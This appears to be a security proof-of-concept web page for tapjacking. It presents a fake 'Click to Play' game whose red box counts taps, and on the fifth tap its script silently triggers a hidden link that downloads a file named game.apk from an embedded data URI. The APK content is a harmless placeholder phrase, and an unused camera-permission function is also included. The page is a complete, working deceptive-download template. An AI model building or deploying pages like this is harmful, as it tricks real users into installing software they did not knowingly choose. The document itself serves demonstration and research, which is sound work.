<!DOCTYPE html>
<html>
<head>
  <title>Download Tapjacking POC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      user-select: none;
    }

    #redBox {
      position: absolute;
      top: 380px;
      left: 300px;
      width: 30px;
      height: 30px;
      background-color: red;
      cursor: pointer;
    }

    #counter, #first {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      font-size: 40px;
    }
  </style>
  <script>
        function requestCameraPermission() {
      // Get access to the camera
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(function (stream) {
          console.log('Camera permission granted.');
        })
        .catch(function (error) {
          console.error('Error accessing the camera:', error);
        });
    }

    var clickCount = 0;

    function handleClick() {
      clickCount++;
      document.getElementById("counter").innerHTML = "x" + clickCount;

      if (clickCount == 5) {
        document.getElementById("download").click();
      }
    }

    function startGame() {
      document.getElementById("game").style.display = "block";
      document.getElementById("first").style.display = "none";
    }
    
  </script>
</head>
<body>
  <center id="first" style="padding: 15px;">
    <button onclick="startGame()">Click to Play</button>
  </center>
  <a href="data:application/vnd.android.package-archive;base64,UGVhY2UgQmUgVXBvbiBZb3U=" download="game.apk" id="download" hidden>Download APK</a>

  <div id="game" style="display: none;">
    <div id="redBox" onclick="handleClick()"></div>
    <div id="counter">Click the [redacted name] Box x6 to win!</div>
  </div>

</body>

</html>
